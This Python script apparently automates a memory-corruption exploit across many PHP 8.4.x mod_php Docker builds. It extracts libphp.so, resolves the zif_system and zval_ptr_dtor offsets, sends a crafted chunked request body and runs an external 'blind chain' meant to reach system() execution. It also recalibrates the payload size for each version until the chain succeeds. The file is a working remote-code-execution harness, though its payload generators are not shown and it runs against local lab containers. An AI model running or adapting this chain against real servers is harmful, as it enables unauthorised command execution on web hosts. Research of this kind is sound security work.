#!/usr/bin/env python3
"""8.4.x mod_php matrix driver v2.

Per build: pull image -> extract libphp.so + stock php.ini-production ->
derive zif_system / zval_ptr_dtor -> probe A1 -> blind chain (single-A2) ->
on A1 non-OOM, calibrate the A1 parts count and re-run.  Resumable.
"""
import hashlib, json, os, re, subprocess, sys, time, urllib.request

D = "/tmp/opencode/research/modphp_84_matrix_20261023T074116Z"
PURE = "/tmp/opencode/research/9bie_update_20261022T115026Z/code/repo/pure"
PORT0 = 19300
VERSIONS = ["8.4.%d" % v for v in ([1, 2, 3, 4, 5, 6, 7, 8] + list(range(10, 28)))]
ONLY = os.environ.get("ONLY", "")
if ONLY:
    VERSIONS = ONLY.split(",")
KEEP_IMAGES = os.environ.get("KEEP_IMAGES", "0") == "1"


def sh(cmd, timeout=900):
    return subprocess.run(cmd, shell=isinstance(cmd, str), capture_output=True,
                          text=True, timeout=timeout)


def pull(v):
    img = "php:%s-apache" % v
    if sh(["docker", "image", "inspect", img]).returncode == 0:
        return True
    for k in range(3):
        r = sh(["docker", "pull", img], timeout=600)
        if r.returncode == 0:
            return True
        print("  pull retry", k, r.stderr[-200:], flush=True)
        time.sleep(5)
    return False


def symbols(path):
    r = sh(["readelf", "-sW", path])
    out = {}
    for line in r.stdout.splitlines():
        m = re.match(r"\s*\d+:\s+([0-9a-f]+)\s+\d+\s+\w+\s+\w+\s+\w+\s+\w+\s+(\S+)$", line)
        if not m:
            continue
        name = m.group(2)
        if name in ("zif_system", "zval_ptr_dtor") and name not in out:
            out[name] = int(m.group(1), 16)
    return out


def wait_ready(port, tries=120):
    for _ in range(tries):
        try:
            with urllib.request.urlopen("http://127.0.0.1:%d/index.php" % port, timeout=2) as f:
                if f.status == 200:
                    return True
        except Exception:
            pass
        time.sleep(0.5)
    return False


def gen_a1(path, parts=860, big=78, tail=0):
    r = sh([sys.executable, os.path.join(PURE, "mk_a1.py"), "--out", path,
            "--parts", str(parts), "--big", str(big), "--tail", str(tail)])
    return r.returncode == 0


def a1_probe(port, body, outdir, query="?q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v"):
    os.makedirs(outdir, exist_ok=True)
    save = os.path.join(outdir, "a1.resp")
    r = sh([sys.executable, os.path.join(PURE, "chunked_send.py"),
            "--port", str(port), "--body-file", body, "--path", "/index.php" + query,
            "--timeout", "300", "--save-response", save])
    data = open(save, "rb").read() if os.path.exists(save) else b""
    return {"status": data.split(b"\r\n", 1)[0].decode("latin1", "replace") if data else "no-response",
            "bytes": len(data)}


def chain(port, ctr, a1, b1, syms, marker, outdir, s_off="0xF8398", n=5):
    cmd = [sys.executable, os.path.join(D, "scripts/chain84.py"),
           "--port", str(port), "--container", ctr, "--a1", a1, "--b1", b1,
           "--n", str(n), "--zif-off", hex(syms["zif_system"]),
           "--zdtor-off", hex(syms["zval_ptr_dtor"]), "--s-off", s_off,
           "--marker", marker, "--outdir", outdir, "--restart"]
    r = sh(cmd, timeout=1200)
    rf = os.path.join(outdir, "result.json")
    res = json.load(open(rf)) if os.path.exists(rf) else {}
    res["_stdout_tail"] = r.stdout[-2000:]
    return res


def run_build(v, port, ctr, img, rdir, outroot):
    meta = {"version": v, "image": img, "port": port}
    os.makedirs(rdir, exist_ok=True)
    if not pull(v):
        meta["error"] = "image_unavailable"
        return meta
    meta["image_id"] = sh(["docker", "image", "inspect", img, "--format", "{{.Id}}"]).stdout.strip()
    sh(["docker", "rm", "-f", ctr])
    if sh(["docker", "create", "--name", ctr, img]).returncode != 0:
        meta["error"] = "create_failed"
        return meta
    so = os.path.join(D, "so", "libphp-%s.so" % v)
    ini = os.path.join(D, "lab", "php.ini-production-%s" % v)
    sh(["docker", "cp", ctr + ":/usr/lib/apache2/modules/libphp.so", so])
    sh(["docker", "cp", ctr + ":/usr/local/etc/php/php.ini-production", ini])
    sh(["docker", "rm", "-f", ctr])
    if not os.path.exists(so):
        meta["error"] = "libphp_missing"
        return meta
    syms = symbols(so)
    meta["so_sha256"] = sh(["sha256sum", so]).stdout.split()[0]
    meta["so_bytes"] = os.path.getsize(so)
    meta["symbols"] = {k: hex(x) for k, x in syms.items()}
    if len(syms) != 2:
        meta["error"] = "symbols_missing"
        return meta
    outproof = os.path.join(outroot, "%s_proof" % v)
    os.makedirs(outproof, exist_ok=True)
    os.chmod(outproof, 0o777)
    sh(["docker", "run", "-d", "--name", ctr, "-p", "127.0.0.1:%d:80" % port,
        "-v", os.path.join(D, "lab/conf/000-default.conf") + ":/etc/apache2/sites-enabled/000-default.conf",
        "-v", os.path.join(D, "lab/www") + ":/var/www/html:ro",
        "-v", ini + ":/usr/local/etc/php/php.ini:ro",
        "-v", outproof + ":/out", img])
    if not wait_ready(port):
        meta["error"] = "not_ready"
        sh(["docker", "rm", "-f", ctr])
        return meta
    canary = sh(["docker", "exec", ctr, "sh", "-c", "curl -s http://127.0.0.1/diag.php"]).stdout
    if ("version=%s" % v) not in canary:
        meta["error"] = "canary_mismatch: " + canary.replace("\n", " ")[:200]
        meta["canary"] = canary
        sh(["docker", "rm", "-f", ctr])
        return meta
    meta["php"] = sh(["docker", "exec", ctr, "php", "-v"]).stdout.splitlines()[:1]
    meta["apache"] = sh(["docker", "exec", ctr, "apache2", "-v"]).stdout.strip()
    meta["ini_sha256"] = sh(["sha256sum", ini]).stdout.split()[0]
    meta["ini_md5"] = sh(["md5sum", ini]).stdout.split()[0]
    meta["effective_ini"] = sh(["docker", "exec", ctr, "sh", "-c",
                               "curl -s http://127.0.0.1/diag.php"]).stdout.strip()

    a1 = os.path.join(D, "bodies/a1.bin")
    b1 = os.path.join(D, "bodies/b1.bin")
    # A1 probe on a fresh worker generation
    sh(["docker", "restart", ctr])
    time.sleep(1.2)
    probe = a1_probe(port, a1, os.path.join(outroot, v, "probe_a1"))
    meta["a1_probe"] = probe
    print("  A1 probe:", probe, flush=True)

    if " 500 " in probe["status"]:
        res = chain(port, ctr, a1, b1, syms, "M84_%s_a" % v.replace(".", ""),
                    os.path.join(outroot, v, "try0"))
        meta["chain"] = res
        if not res.get("success"):
            res2 = chain(port, ctr, a1, b1, syms, "M84_%s_b" % v.replace(".", ""),
                         os.path.join(outroot, v, "try1"))
            meta["chain2"] = res2
            meta["success"] = bool(res2.get("success"))
            meta["final"] = res2
        else:
            meta["success"] = True
            meta["final"] = res
    else:
        # calibrate parts for this build
        calib = []
        found = None
        for parts in [880, 900, 920, 940, 960, 980, 1000, 1020, 1040, 820, 800, 780]:
            ap = os.path.join(D, "bodies", "a1-%s-p%d.bin" % (v, parts))
            gen_a1(ap, parts=parts)
            sh(["docker", "restart", ctr]); time.sleep(1.2)
            pr = a1_probe(port, ap, os.path.join(outroot, v, "calib_p%d" % parts))
            row = {"parts": parts, "probe": pr}
            print("   calib parts=%d -> %s" % (parts, pr["status"]), flush=True)
            if " 500 " in pr["status"]:
                r = chain(port, ctr, ap, b1, syms, "M84_%s_p%d" % (v.replace(".", ""), parts),
                          os.path.join(outroot, v, "calib_p%d_chain" % parts))
                row["chain"] = {"success": r.get("success"), "failed": r.get("failed")}
                if r.get("success"):
                    found = {"parts": parts, "a1": ap, "result": r}
                    calib.append(row)
                    break
            calib.append(row)
        meta["calibration"] = calib
        if found:
            meta["success"] = True
            meta["final"] = found["result"]
            meta["a1_calibrated"] = {"parts": found["parts"], "body": found["a1"]}
        else:
            meta["success"] = False
            meta["error"] = "A1_no_OOM_after_calibration"
    logs = sh(["docker", "logs", ctr])
    open(os.path.join(rdir, "docker.log"), "w").write(logs.stdout + logs.stderr)
    acc = sh(["docker", "exec", ctr, "cat", "/var/log/apache2/p2s-access.log"])
    open(os.path.join(rdir, "access.log"), "w").write(acc.stdout)
    meta["crash_lines"] = [l for l in (logs.stdout + logs.stderr).splitlines()
                           if "Segmentation" in l or "Aborted" in l or "AH00052" in l][-6:]
    sh(["docker", "rm", "-f", ctr])
    if not KEEP_IMAGES:
        sh(["docker", "rmi", img])
    return meta


def main():
    outroot = os.path.join(D, "out")
    os.makedirs(outroot, exist_ok=True)
    for v in VERSIONS:
        final = os.path.join(outroot, v, "final.json")
        if os.path.exists(final):
            print("skip", v, flush=True)
            continue
        port = PORT0 + int(v.split(".")[-1])
        ctr = "m84-%s" % v
        rdir = os.path.join(D, "receipts", v)
        print("=== %s ===" % v, flush=True)
        try:
            meta = run_build(v, port, ctr, "php:%s-apache" % v, rdir, outroot)
        except Exception as e:
            meta = {"version": v, "error": "exception: %r" % (e,)}
            sh(["docker", "rm", "-f", ctr])
        json.dump(meta, open(os.path.join(rdir, "meta.json"), "w"), indent=1)
        os.makedirs(os.path.join(outroot, v), exist_ok=True)
        json.dump(meta, open(final, "w"), indent=1)
        print(" -> %s: success=%s error=%s" % (v, meta.get("success"), meta.get("error")), flush=True)


if __name__ == "__main__":
    main()
